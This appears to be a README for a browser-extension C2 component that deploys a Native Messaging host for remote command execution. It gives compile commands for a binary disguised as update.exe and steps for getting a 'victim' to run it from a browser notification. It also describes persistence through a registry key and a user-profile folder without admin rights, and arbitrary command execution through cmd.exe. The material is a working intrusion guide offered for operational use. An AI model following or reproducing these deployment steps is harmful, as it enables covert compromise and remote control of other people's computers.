# EdgeShot RCE Native Host

The `execute_cmd` and `check_rce` commands talk to a **Native Messaging host**
(`com.site.agent`) over stdin/stdout. This folder ships the host **source** — it
is NOT compiled by the Mythic build container (no Windows cross-compiler there).
Compile it once locally, host the binary, then drop it with `execute_file`.

## 1. Compile (Windows host)

```bash
# Edge target
x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DBROWSER=edge \
  -o update.exe native-host.c

# Chrome target
x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DBROWSER=chrome \
  -o update.exe native-host.c
```

Result: a ~46 KB standalone `update.exe`, no dependencies. Install MinGW with
`sudo dnf install mingw64-gcc` (Fedora) or `sudo apt install gcc-mingw-w64-x86-64`
(Debian/Ubuntu).

## 2. Deploy

1. Host `update.exe` anywhere the victim's browser can reach it.
2. `execute_file <url_to_update.exe>` — the victim clicks the notification and
   the binary runs.
3. The binary is **dual-mode**: on first run it installs itself
   (`%LOCALAPPDATA%\Config\update.exe` + `manifest.json` + an `HKCU` registry key),
   then exits. No admin rights required.
4. Restart the browser so it re-reads the registry (the host is only discovered
   at browser startup).
5. `check_rce` to confirm, then `execute_cmd whoami`.

## 3. Protocol

The host speaks the Chrome Native Messaging framing: 4-byte little-endian length
prefix + UTF-8 JSON, over stdin/stdout.

| Action | Request | Response |
|--------|---------|----------|
| `ping` | `{"action":"ping"}` | `{"result":"pong"}` |
| `execute_cmd` | `{"action":"execute_cmd","command":"..."}` | `{"result":"<output>"}` |

On Windows the command runs through `cmd.exe /C "<command>"`; output is captured
with a 60 s timeout. Message size is capped at 1 MB (Chrome's limit).

## 4. Notes

- The host discovers extension IDs at install time (both packed and unpacked) so
  `allowed_origins` matches the real agent ID — Chrome rejects wildcards.
- `allowed_origins` uses `chrome-extension://<32-char-id>/`.
- If `check_rce` reports `rce_active: false`, the host is not installed or the
  browser has not been restarted since installation.
